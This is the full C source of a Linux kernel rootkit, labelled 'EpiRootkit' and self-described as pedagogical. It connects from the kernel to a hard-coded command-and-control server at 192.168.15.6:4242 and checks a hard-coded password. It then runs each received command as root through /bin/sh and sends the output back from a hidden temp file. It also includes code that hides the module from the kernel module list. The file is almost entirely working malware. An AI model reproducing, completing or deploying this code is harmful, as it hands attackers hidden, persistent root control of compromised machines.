#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <linux/list.h>
#include <linux/uio.h>
#include <linux/security.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
    char password[32];
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 2048,
    .xor_key = "epirootkit",
    .password = "epirookit"
};

static struct socket *g_sock = NULL;
static struct task_struct *g_thread = NULL;
static int connection_state = 0;
static unsigned long last_reconnect_attempt = 0;
#define RECONNECT_DELAY_MS 3000

static struct list_head *prev_module = NULL;

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    printk(KERN_INFO "epirootkit: Module hidden from list\n");
}

static void unhide_module(void) {
    if (prev_module) {
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
        printk(KERN_INFO "epirootkit: Module unhidden\n");
    }
}

static int connect_to_c2_server(void) {
    struct sockaddr_in server;
    int err;

    err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
    if (err < 0) {
        pr_err("epirootkit: socket creation failed (%d)\n", err);
        return err;
    }

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(config.port);
    server.sin_addr.s_addr = in_aton(config.server_ip);

    err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server,
                               sizeof(server), O_NONBLOCK);
    if (err && err != -EINPROGRESS) {
        pr_err("epirootkit: connect failed (%d)\n", err);
        sock_release(g_sock);
        g_sock = NULL;
        return err;
    }

    pr_info("epirootkit: Connected to C2 server at %s:%d\n",
            config.server_ip, config.port);

    return 0;
}

static int send_to_c2(const char *msg, size_t len) {
    struct kvec iov;
    struct msghdr msg_hdr = {0};
    int sent;

    if (!g_sock)
        return -ENOTCONN;

    iov.iov_base = (char *)msg;
    iov.iov_len = len;

    sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
    if (sent < 0) {
        pr_err("epirootkit: failed to send data (%d)\n", sent);
        return sent;
    }

    pr_info("epirootkit: sent %d bytes to C2\n", sent);
    return 0;
}


static int command_loop(void *data) {
    char buffer[2048];
    struct kvec iov;
    struct msghdr msg_hdr = {0};
    int len, authenticated = 0;
    // Declarations moved to top for ISO C90 compliance
    char full_cmd[2048];
    char *argv[4];
    char *envp[4];
    int ret;
    struct file *f;
    loff_t pos;
    ssize_t rlen;
    char outbuf[1024];

    pr_info("epirootkit: command_loop started\n");

    while (!kthread_should_stop()) {
        memset(buffer, 0, sizeof(buffer));
        iov.iov_base = buffer;
        iov.iov_len = sizeof(buffer) - 1;

        len = kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, sizeof(buffer) - 1, MSG_DONTWAIT);
        if (len <= 0) {
            msleep(500);
            continue;
        }

        buffer[len] = '\0';

        if (!authenticated) {
            if (strncmp(buffer, config.password, strlen(config.password)) == 0) {
                authenticated = 1;
                pr_info("epirootkit: authenticated\n");
                send_to_c2("AUTH OK\n", 8);
            } else {
                pr_info("epirootkit: bad password\n");
                send_to_c2("AUTH FAIL\n", 10);
            }
            continue;
        }

        // Si on est authentifié, on exécute la commande
        snprintf(full_cmd, sizeof(full_cmd), "%s > /tmp/.rk_out 2>&1", buffer);

        argv[0] = "/bin/sh";
        argv[1] = "-c";
        argv[2] = full_cmd;
        argv[3] = NULL;
        envp[0] = "HOME=/";
        envp[1] = "TERM=linux";
        envp[2] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
        envp[3] = NULL;

        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        if (ret)
            pr_err("epirootkit: command failed (%d)\n", ret);
        else
            pr_info("epirootkit: command executed\n");

        // On lit et on envoi au C2
        f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
        if (!IS_ERR(f)) {
            pos = 0;
            do {
                memset(outbuf, 0, sizeof(outbuf));
                rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
                if (rlen > 0) {
                    send_to_c2(outbuf, rlen);
                    pos += rlen;
                }
            } while (rlen > 0);
            filp_close(f, NULL);
        }
    }
    return 0;
}

static int connection_loop(void *data) {
    while (!kthread_should_stop()) {
        if (!g_sock) {
            pr_info("epirootkit: trying to connect to C2...\n");
            if (connect_to_c2_server() == 0) {
                notify_connection_state(1);
                pr_info("epirootkit: launching command_loop\n");
                g_thread = kthread_run(command_loop, NULL, "rk_cmd");
                if (IS_ERR(g_thread)) {
                    pr_err("epirootkit: command_loop failed\n");
                    g_thread = NULL;
                    sock_release(g_sock);
                    g_sock = NULL;
                    notify_connection_state(0);
                }
            }
        }
        msleep(3000); // on va dormir 3 secondes avant de réessayer
    }
    return 0;
}



static int __init epirootkit_init(void) {
    int err;

    pr_info("epirootkit: Initializing...\n");

    g_sock = NULL;
    g_thread = NULL;
    connection_state = 0;
    prev_module = NULL;

    g_thread = kthread_run(connection_loop, NULL, "rk_conn");
if (IS_ERR(g_thread)) {
    pr_err("epirootkit: Failed to start connection_loop\n");
    return PTR_ERR(g_thread);
}

    if (IS_ERR(g_thread)) {
        pr_err("epirootkit: Failed to create command thread\n");
        sock_release(g_sock);
        g_sock = NULL;
        return PTR_ERR(g_thread);
    }

    notify_connection_state(1);
    send_to_c2("DONE\n", 6);
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("epirootkit: Cleaning up module...\n");

    if (g_thread) {
    pr_info("epirootkit: Stopping thread...\n");
    kthread_stop(g_thread);
    g_thread = NULL;
}

    if (g_sock) {
        pr_info("epirootkit: Closing socket...\n");
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }

    if (prev_module && THIS_MODULE) {
        pr_info("epirootkit: Unhiding module...\n");
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
    }

    pr_info("epirootkit: Cleanup complete\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
